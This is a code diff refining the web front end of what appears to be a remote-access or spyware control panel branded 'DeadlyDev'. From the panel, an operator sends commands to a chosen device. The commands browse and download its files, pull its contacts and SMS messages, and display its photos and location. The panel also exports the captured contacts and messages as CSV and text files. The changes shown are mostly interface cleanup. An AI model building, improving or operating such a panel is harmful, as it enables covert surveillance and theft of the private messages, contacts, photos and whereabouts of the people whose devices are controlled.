   if (isMob()) { closeSb(); goTab('ctrl', document.getElementById('tab-ctrl')); }
 }
 
 // ── Commands
 function sc(action, params={}) {
-  if (!selId) { return; }
-  if (!ws || ws.readyState !== 1) return;
+  if (!selId || !ws || ws.readyState !== 1) return;
   ws.send(JSON.stringify({ type:'send_command', deviceId:selId, action, params }));
 }
 
@@ -483,23 +534,36 @@ function doSms() {
   toggleSms();
 }
 
-// ── Result renderers
-function addResult(tag, html) {
+// ── Result helpers
+function ts() { return new Date().toLocaleTimeString([], {hour:'2-digit',minute:'2-digit'}); }
+
+function addResult(tag, html, cardId) {
+  const r = document.getElementById('results');
+  if (cardId) {
+    removeOtherPanels(cardId);
+    const existing = document.getElementById(cardId);
+    if (existing) {
+      existing.querySelector('.rb').innerHTML = html;
+      existing.querySelector('.rtime').textContent = ts();
+      existing.scrollIntoView({ behavior:'smooth', block:'nearest' });
+      return;
+    }
+  }
   const div = document.createElement('div');
   div.className = 'ri';
-  div.innerHTML = `<div class="rh"><span class="rt">${tag}</span><span>${new Date().toLocaleTimeString()}</span></div><div class="rb">${html}</div>`;
-  const r = document.getElementById('results');
+  if (cardId) div.id = cardId;
+  div.innerHTML = `<div class="rh"><span class="rt">${tag}</span><span class="rtime">${ts()}</span></div><div class="rb">${html}</div>`;
   r.prepend(div);
   while (r.children.length > 30) r.removeChild(r.lastChild);
 }
 
-function addText(t, tag='Response') {
+function addText(t, tag='📋 Response') {
   addResult(tag, `<pre>${x(t)}</pre>`);
 }
 
 function addPhoto(m) {
   const src = 'data:image/jpeg;base64,' + m.fileData;
-  addResult('📷 Photo', `<img src="${src}"><br><a href="${src}" download="${m.fileName||'photo.jpg'}" class="dl-link">⬇ Save Photo</a>`);
+  addResult('📷 Photo', `<img src="${src}"><br><a href="${src}" download="${x(m.fileName||'photo.jpg')}" class="dl-link">⬇ Save Photo</a>`);
 }
 
 function addFile(m) {
@@ -515,21 +579,23 @@ function addLoc(m) {
   addResult('📍 Location', `<div class="loc-pre">${m.caption?x(m.caption):''}</div><a href="${url}" target="_blank" class="map-link">🗺 Open in Google Maps</a>`);
 }
 
+// ── File Manager (reuses fm-card, removes contacts/msg panels)
 function addFm(m) {
   const path = m.path||'/';
   const items = m.items||[];
-  let h = `<div class="fm-path">📁 ${x(path)}</div>`;
+  let h = `<div class="fm-path">📂 ${x(path||'/')}</div>`;
   if (path && path !== '/') {
     const par = path.includes('/') ? path.substring(0,path.lastIndexOf('/'))||'/' : '/';
-    h += `<div class="fm-back" onclick="sc('list_files',{path:'${x(par)}'})">⬅ Back</div>`;
+    h += `<div class="fm-back" onclick="sc('list_files',{path:'${x(par)}'})">← Back</div>`;
   }
-  if (!items.length) { h += '<div class="fm-empty">Empty folder</div>'; }
-  else {
+  if (!items.length) {
+    h += '<div class="fm-empty">This folder is empty</div>';
+  } else {
     h += '<div class="fm-list">';
     items.forEach(it => {
       if (it.isDir) {
         const np = (path==='/'?'':path)+'/'+it.name;
-        h += `<div class="fmi" onclick="sc('list_files',{path:'${x(np)}'})"><span class="fi">📁</span><span class="fn">${x(it.name)}</span><span class="fs">${it.size||'—'}</span></div>`;
+        h += `<div class="fmi" onclick="sc('list_files',{path:'${x(np)}'})"><span class="fi">📁</span><span class="fn">${x(it.name)}</span><span class="fs">—</span></div>`;
       } else {
         const fp = (path==='/'?'':path)+'/'+it.name;
         h += `<div class="fmi"><span class="fi">${ficon(it.name)}</span><span class="fn">${x(it.name)}</span><span class="fs">${it.size||'—'}</span><button class="fdl" onclick="event.stopPropagation();sc('download_file',{path:'${x(fp)}'})">⬇ DL</button></div>`;
@@ -537,29 +603,20 @@ function addFm(m) {
     });
     h += '</div>';
   }
-  // Reuse existing FM card — navigate in-place, don't spawn new cards
-  const existing = document.getElementById('fm-card');
-  if (existing) {
-    existing.querySelector('.rb').innerHTML = h;
-    existing.querySelector('.rh span:last-child').textContent = new Date().toLocaleTimeString();
-    existing.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-  } else {
-    const div = document.createElement('div');
-    div.className = 'ri'; div.id = 'fm-card';
-    div.innerHTML = `<div class="rh"><span class="rt">📁 File Manager</span><span>${new Date().toLocaleTimeString()}</span></div><div class="rb">${h}</div>`;
-    const r = document.getElementById('results');
-    r.prepend(div);
-    while (r.children.length > 30) r.removeChild(r.lastChild);
-  }
+  addResult('📁 File Manager', h, 'fm-card');
 }
 
-// ── Contacts panel
+// ── Contacts (reuses contacts-card, removes msg/fm panels)
 function showContacts(list) {
   window._allC = list;
-  addResult('👥 Contacts', buildContactsHtml(list, list));
+  const h = buildContactsHtml(list, list);
+  addResult('📋 Contacts', h, 'contacts-card');
   requestAnimationFrame(() => {
     document.getElementById('dl-c')?.addEventListener('click', () => dlContacts(list));
-    document.getElementById('ref-c')?.addEventListener('click', () => { delete cache[selId]?.contacts; sc('get_contacts_web'); });
+    document.getElementById('ref-c')?.addEventListener('click', () => {
+      if (cache[selId]) delete cache[selId].contacts;
+      sc('get_contacts_web');
+    });
   });
 }
 
@@ -567,15 +624,15 @@ function buildContactsHtml(all, filtered) {
   return `<div class="dp">
     <div class="dp-top">
       <div class="dp-info">
-        <div class="dp-title">👥 Contact List</div>
+        <div class="dp-title">Contact List</div>
         <div class="dp-count">${all.length} contacts${filtered.length!==all.length?' · '+filtered.length+' shown':''}</div>
       </div>
       <div class="dp-actions">
-        <button class="dl-btn" id="dl-c">⬇ CSV</button>
-        <button class="cb" id="ref-c" style="font-size:11px;padding:5px 10px">↻</button>
+        <button class="dp-btn" id="dl-c">⬇ CSV</button>
+        <button class="dp-btn gray" id="ref-c">↻ Refresh</button>
       </div>
     </div>
-    <input class="srch" placeholder="🔍 Search name / number…" oninput="filterC(this.value)">
+    <input class="srch" placeholder="Search name / number…" oninput="filterC(this.value)">
     <div class="tbl-wrap" id="ctbl">${renderCTable(filtered)}</div>
   </div>`;
 }
@@ -593,8 +650,12 @@ function renderCTable(list) {
 
 window.filterC = function(q) {
   const all = window._allC||[];
-  const f = q ? all.filter(c => (c.name||'').toLowerCase().includes(q.toLowerCase()) ||
-    (c.phones||[]).some(p=>p.includes(q)) || (c.emails||[]).some(e=>e.toLowerCase().includes(q.toLowerCase()))) : all;
+  const lq = q.toLowerCase();
+  const f = q ? all.filter(c =>
+    (c.name||'').toLowerCase().includes(lq) ||
+    (c.phones||[]).some(p=>p.includes(q)) ||
+    (c.emails||[]).some(e=>e.toLowerCase().includes(lq))
+  ) : all;
   const el = document.getElementById('ctbl');
   if (el) el.innerHTML = renderCTable(f);
 };
@@ -607,13 +668,17 @@ function dlContacts(list) {
   dl(csv, 'text/csv', `contacts_${selId}_${Date.now()}.csv`);
 }
 
-// ── Messages panel
+// ── Messages (reuses msg-card, removes contacts/fm panels)
 function showMessages(list) {
   window._allM = list;
-  addResult('💬 Messages', buildMsgHtml(list, list));
+  const h = buildMsgHtml(list, list);
+  addResult('📨 Messages', h, 'msg-card');
   requestAnimationFrame(() => {
     document.getElementById('dl-m')?.addEventListener('click', () => dlMessages(list));
-    document.getElementById('ref-m')?.addEventListener('click', () => { delete cache[selId]?.messages; sc('get_sms_web'); });
+    document.getElementById('ref-m')?.addEventListener('click', () => {
+      if (cache[selId]) delete cache[selId].messages;
+      sc('get_sms_web');
+    });
   });
 }
 
@@ -621,15 +686,15 @@ function buildMsgHtml(all, filtered) {
   return `<div class="dp">
     <div class="dp-top">
       <div class="dp-info">
-        <div class="dp-title">💬 Messages</div>
+        <div class="dp-title">Messages</div>
         <div class="dp-count">${all.length} messages${filtered.length!==all.length?' · '+filtered.length+' shown':''}</div>
       </div>
       <div class="dp-actions">
-        <button class="dl-btn" id="dl-m">⬇ TXT</button>
-        <button class="cb" id="ref-m" style="font-size:11px;padding:5px 10px">↻</button>
+        <button class="dp-btn" id="dl-m">⬇ TXT</button>
+        <button class="dp-btn gray" id="ref-m">↻ Refresh</button>
       </div>
     </div>
-    <input class="srch" placeholder="🔍 Search number / text…" oninput="filterM(this.value)">
+    <input class="srch" placeholder="Search number / text…" oninput="filterM(this.value)">
     <div class="msg-list" id="mlist">${renderMList(filtered)}</div>
   </div>`;
 }
@@ -639,7 +704,7 @@ function renderMList(list) {
   return list.map(m => `<div class="msg-item">
     <div class="msg-hd">
       <div class="msg-fr">${x(m.address||'Unknown')}</div>
-      <span class="msg-badge ${m.type==='sent'?'sn':'in'}">${m.type==='sent'?'📤 Sent':'📥 Inbox'}</span>
+      <span class="msg-badge ${m.type==='sent'?'sn':'in'}">${m.type==='sent'?'Sent':'Inbox'}</span>
       <div class="msg-dt">${x(m.date||'')}</div>
     </div>
     <div class="msg-bd">${x(m.body||'')}</div>
@@ -648,13 +713,17 @@ function renderMList(list) {
 
 window.filterM = function(q) {
   const all = window._allM||[];
-  const f = q ? all.filter(m => (m.address||'').includes(q) || (m.body||'').toLowerCase().includes(q.toLowerCase())) : all;
+  const lq = q.toLowerCase();
+  const f = q ? all.filter(m =>
+    (m.address||'').includes(q) ||
+    (m.body||'').toLowerCase().includes(lq)
+  ) : all;
   const el = document.getElementById('mlist');
   if (el) el.innerHTML = renderMList(f);
 };
 
 function dlMessages(list) {
-  let t = 'DeadlyDev - SMS Export\n' + '═'.repeat(36) + '\n\n';
+  let t = 'DeadlyDev — SMS Export\n' + '═'.repeat(36) + '\n\n';
   list.forEach(m => {
     t += `[${(m.type||'').toUpperCase()}] ${m.address||'?'}   ${m.date||''}\n${m.body||''}\n${'─'.repeat(36)}\n`;
   });
@@ -700,7 +769,9 @@ function dl(content, type, fname) {
   a.download = fname; a.click();
 }
 function copyUrl() {
-  navigator.clipboard?.writeText(wsUrl).then(()=>alert('URL copied!')).catch(()=>{});
+  navigator.clipboard?.writeText(wsUrl)
+    .then(()=>{ const p=document.getElementById('conn-pill'); const o=p.textContent; p.textContent='✓ Copied!'; setTimeout(()=>{ p.textContent=o; },1500); })
+    .catch(()=>{});
 }
 </script>
 </body>
